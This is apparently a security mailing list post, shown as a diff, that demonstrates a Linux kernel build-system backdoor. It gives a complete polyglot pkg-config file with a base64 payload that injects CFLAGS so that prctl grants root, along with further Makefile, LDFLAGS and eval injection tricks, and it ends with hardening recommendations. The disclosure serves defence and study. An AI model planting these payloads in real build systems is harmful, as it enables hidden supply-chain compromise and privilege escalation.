@@ -1,0 +1,330 @@
+
+Date: Wed, 17 Apr 2024 02:07:43 +0200
+From: Vegard Nossum <vegard.nossum@...cle.com>
+To: oss-security@...ts.openwall.com
+Subject: Make your own backdoor: CFLAGS code injection, Makefile injection,
+ pkg-config
+
+Hi all,
+
+Given the recent xz/sshd backdoor, I wanted to try to think more like
+an attacker and build my own backdoor.
+
+To start off, I've chosen the Linux kernel as the target for the attack,
+and I want to do it without changing either the kernel source code or
+any release tarballs.
+
+In other words, the backdoor would have to rely on compromising some
+_other_ package that gets installed on a distro build server that is used
+for building the kernel for that particular distro.
+
+For my particular backdoor it doesn't really matter which exact package
+is compromised; all that is required is the existence of a file
+/usr/lib64/pkgconfig/libelf-uninstalled.pc with mode 755 and containing
+something along the lines of:
+
+   prefix=/usr
+   exec_prefix=/usr
+   libdir=/usr/lib64
+   includedir=/usr/include
+   f=$objtree/include/config/auto.conf
+ 
+sig=Q0ZMQUdTX3N5cy5vPSctRFNFVF9FTkRJQU4oeCx5KT0tMjIsY29tbWl0X2NyZWRzKCh2b2lkKilpbml0X3Rhc2suY3JlZCknCg==
+   grep -q sys.o $f || sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f; exit
+
+   Name: libelf
+   Description: elfutils libelf library to read and write ELF files
+   Version: 0.189
+   URL: http://elfutils.org/
+
+   Libs: -L${libdir} -lelf
+   Cflags: -I${includedir} 
+-DLIBELF='$(/usr/lib64/pkgconfig/libelf-uninstalled.pc)'
+
+   Requires.private: zlib libzstd
+
+(This is based on an existing file for libelf, typically located at either
+/usr/lib64/pkgconfig/libelf.pc or
+/usr/lib/x86_64-linux-gnu/pkgconfig/libelf.pc.)
+
+Now, you could argue that this is easy to spot -- why would a pkg-config
+file contain base64 data, why would an unrelated package contain something
+that looks like it belongs to libelf, etc. I would argue that the above
+looks suspicious but not necessarily like a kernel backdoor and could
+potentially pass for a legitimate file; moreover, that a malicious
+maintainer could introduce it into a less well-reviewed distro package
+that happens to be installed by default.
+
+In any case, let's see how it works:
+
+When you call 'pkg-config --cflags libelf' (like the kernel build system
+does), this will output:
+
+   -DLIBELF='$(/usr/lib64/pkgconfig/libelf-uninstalled.pc)'
+
+This string will get used by 'make' and passed along to the shell, which
+runs /usr/lib64/pkgconfig/libelf-uninstalled.pc as a shell script.
+
+When the file is run as a shell script, it starts at the top and sets
+prefix, exec_prefix, etc. as local variables. It also sets f, sig, and
+then runs:
+
+   grep -q sys.o $f || sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f; exit
+
+(The 'exit' here is to stop the shell from emitting error messages from
+the subsequent lines.)
+
+This code checks whether 'sys.o' is in $objtree/include/config/auto.conf,
+which is a file used by the kernel during the build ($objtree is defined
+by the kernel build system) -- if not, it runs:
+
+   sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f
+
+This just looks for any line containing the string "ELFCORE" (again in
+auto.conf) and appends another line at that point in the file. If we
+decode the base64 string, we see that it adds the line:
+
+   CFLAGS_sys.o='-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)'
+
+I should mention that libelf is used to build 'objtool', a program that
+itself runs during the kernel build. It is typically built early in the
+build, which gives us a chance to hook into the build system before any
+real kernel code is compiled.
+
+Anyway, after the script is run, include/config/auto.conf will contain
+something like:
+
+   ...
+   CONFIG_ACPI_PROCESSOR=y
+   CONFIG_ELFCORE=y
+   CFLAGS_sys.o='-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)'
+   CONFIG_HIBERNATION_SNAPSHOT_DEV=y
+   CONFIG_HAVE_KVM=y
+   CONFIG_PCCARD=y
+   ...
+
+(I chose CONFIG_ELFCORE= as the insertion point because 1) it's in the
+middle of the file so it's unlikely to be easily spotted at the top or
+bottom, and 2) it has that semi-plausible connection to libelf).
+
+This file, include/config/auto.conf, is read by GNU Make and the kernel
+build system. Even more, it's _evaluated_ by the build system, meaning
+that it is actually a Makefile that can contain arbitrary Make code. In
+this case, the additional line sets the variable CFLAGS_sys.o, which
+contains extra CFLAGS passed to the compiler for any object files named
+sys.o, such as kernel/sys.o, at build time.
+
+The flag passed to the compiler is:
+
+   -DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)
+
+(Thanks to Michael Ellerman for the suggestion to use commit_creds().)
+
+This has the effect of defining the macro SET_ENDIAN(), and for
+kernel/sys.c (when compiled on x86, at least) would have been defined in
+the same file with:
+
+   #ifndef SET_ENDIAN
+   # define SET_ENDIAN(a, b)       (-EINVAL)
+   #endif
+
+It gets used like this:
+
+   SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned 
+long, arg3,
+                   unsigned long, arg4, unsigned long, arg5)
+   {
+   ...
+           switch (option) {
+   ...
+           case PR_SET_ENDIAN:
+                   error = SET_ENDIAN(me, arg2);
+                   break;
+   ...
+           return error;
+   }
+
+Now we see that whenever you call prctl(PR_SET_ENDIAN) from userspace,
+the code will expand to:
+
+           case PR_SET_ENDIAN:
+                   error = -22,commit_creds((void*)init_task.cred);
+                   break;
+
+...which of course means that it still returns -EINVAL, but it additionally
+also makes the calling process root.
+
+No .c or .h source code was touched and there won't be many traces of the
+code during or after the build, except:
+
+  - kernel/.sys.o.cmd
+  - include/config/auto.conf
+  - perhaps the console/build log if the kernel is built with V=1
+
+However, these files are considered internal to the build system and
+normally won't appear in RPMs, manifests, debug info, or anything like
+that. There is no foreign object file, no missing symbols, and no missing
+debug info.
+
+(I should add that we could potentially also attempt to clean these files
+up by inserting additional Makefile code into CFLAGS_sys.o. I'll leave it
+as an exercise to the reader...)
+
+Moreover, kernel/sys.o already contains many calls to commit_creds(), and
+so it won't look particularly suspicious or out of place even when looking
+at the object code/disassembly.
+
+I did an end-to-end test on one (unnamed) distro and the backdoor works.
+
+I originally attempted to use a file in /etc/bash_completion.d/ or
+/etc/environment.d/ to set the 'sub_make_done' environment variable to:
+
+   $(eval export CFLAGS_sys.o := 
+"-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)")
+
+(which would get evaluated by Make); however, these are not read by
+non-interactive shells and so likely wouldn't affect a distro's build
+process -- nevertheless, it demonstrates another pitfall: the fact that
+Make allows you to override arbitrary build-internal variables with
+environment variables and that those strings are evaluated as Makefile
+fragments and can contain essentially arbitrary code (see
+<https://lore.kernel.org/tech-board-discuss/872f9cfd-5c19-4a82-bf75-6256265e8f8a@oracle.com/>
+as well for a bit more on this).
+
+To sum it up, here are some of my takeaways (no doubt known by many
+others already):
+
+- Beware of search paths. pkg-config searches a few different directories
+   and it may be possible to quietly drop something in that will inject
+   itself into the build process.
+
+   Of course, search paths already have a bit of a reputation and the
+   other famous ones are PATH and LD_LIBRARY_PATH which are also viable
+   vectors in this case, assuming you can either influence the list itself
+   or place a malicious file within one of the earlier components.
+
+   I would also consider locales a potential vector -- on my system,
+   running 'make' searches /usr/share/locale/ as well as
+   /usr/share/locale-langpack/ and one could imagine a malicious
+   translation file containing printf formats with %n, for example, to
+   induce memory errors. (I'm not familiar with the file format, but
+   depending on how well the parsers have been tested/fuzzed, it might
+   be possible to do something with intentionally corrupted translation
+   files as well.)
+
+- Beware of polyglot files. In this case, a pkg-config metadata file
+   doubled as a shell script. In the xz backdoor, binary test data also
+   contained shell scripts and object files.
+
+   I unfortunately lost the source, but I read somewhere that valid PNG
+   files can have arbitrary data appended at the end, which seems to be
+   true in a cursory test. There will undoubtedly be other unexpected
+   combinations of files that can be used to hide payloads.
+
+- Speaking of hiding payloads, one could imagine using ANSI escape
+   sequences (e.g. save + restore cursor location) to hide some parts
+   of files from being output into a terminal (e.g. cat) -- however, this
+   is unlikely to be effective for files that are frequently modified
+   with text editors (i.e. source files). For intermediate/generated
+   files or typical console output it might not hurt the attacker to try
+   this to avoid detection.
+
+- Beware of environment variables. Shellshock-style "bash function"
+   overrides of commands, Makefile injections, search paths, build
+   flags: these and more can all be used to subtly influence other
+   programs down the line and often don't really leave a trace in either
+   source code, object code, or build logs.
+
+   Apart from CFLAGS, we can also use LDFLAGS to inject a fragment of
+   Makefile code that checks whether $@ is a particular target, and if
+   so, includes an additional object file:
+
+     $ LDFLAGS='$(if $(filter target,$@),malicious.o,)' make target
+     cc   malicious.o  target.c   -o target
+
+- Eval... since it often means running code that doesn't exist anywhere
+   as a file (and is thus difficult to capture in SBOM-type solutions).
+   Shells and Make both have eval.
+
+- File descriptors can be useful for passing data around without leaving
+   a filesystem footprint. We could imagine a malicious shared object
+   opening a file and later manipulating some command down the line into
+   using the file descriptor as an input:
+
+     fd = memfd_create(...);
+     write(fd, ...);
+     dup2(fd, 9);
+     close(fd);
+     ...
+     setenv("CFLAGS", "$(eval $(shell cat <&9))");
+
+   Here, CFLAGS would get expanded by 'make', resulting in using the shell
+   to read from the file and evaluating the result as a Makefile fragment,
+   while CFLAGS itself would be set to an empty string as long as the
+   Makefile fragment doesn't output any text.
+
+- Symlinks have a rich history of exploitation and can be used to
+   temporarily redirect an otherwise legitimate path to malicious content.
+
+- __attribute__((constructor)) can be used to run code when a shared
+   library is loaded and would be fairly easy to inject through CFLAGS
+   (either using -include or -D)
+
+- Perhaps the most important takeaway of all is that it's not just a
+   project's code, not even a project's direct and indirect runtime
+   dependencies, but ALL its build dependencies as well, that can be used
+   to inject backdoors. The kernel doesn't depend on any shared libraries
+   at runtime -- but as long as we can hijack the build process, we can
+   fairly easily inject code into the compiled kernel.
+
+   On my system, a kernel build runs more than 70 different binaries and
+   loads more than 32 distinct shared libraries. That's a large attack
+   surface.
+
+   I happen to care more about the kernel, but much of what I've described
+   here would apply to other typical C projects.
+
+Many of the things above are known from traditional exploits, but not
+necessarily in the context of trying to influence a build system.
+
+I don't want to make too many recommendations, but here are some that
+came to mind:
+
+1) We should build software in sanitized, minimal environments. In
+    particular, GNU Make looks like an easy target due to how it imports
+    environment variables and evaluates their contents lazily whenever
+    they are used. Maybe this should be made non-default behaviour.
+
+2) In general the practice of passing settings and configuration
+    implicitly through environment variables doesn't seem like a great
+    idea. Could we sanitize or enforce environment variables through
+    something like seccomp or landlock? We could imagine the top-level
+    build process declaring "from here on, any exec() cannot remove or
+    change CFLAGS" or "from here on, PKG_CONFIG_PATH cannot be set".
+
+3) Distro build systems could output their environment variables at
+    various stages of the build so they can be audited for any suspicious
+    variables or values.
+
+4) It might be useful to perform builds using overlayfs or landlock so
+    that ALL other files on the system that are not used for the build
+    are removed or made inaccessible.
+
+5) Use separate source and build directories. All source files and
+    directories must be read-only to prevent tampering during the build.
+
+6) It might be useful to have build systems output straight-line shell
+    scripts (using no functions or variables) that can be generated and
+    executed in separate stages (perhaps isolated from each other using
+    overlayfs or containers) and inspected and diffed. In other words,
+    separating the build system from the build.
+
+Even if we did all of this, it would of course still not be enough. The
+underlying problem is having things that are unreadable or unreviewable --
+binary files, inscrutable code (whether shell scripts, makefiles, m4 code,
+or, in some cases, Perl code).
+
+Anyway, I hope this was useful, I certainly learnt a lot.
+
+
+Vegard
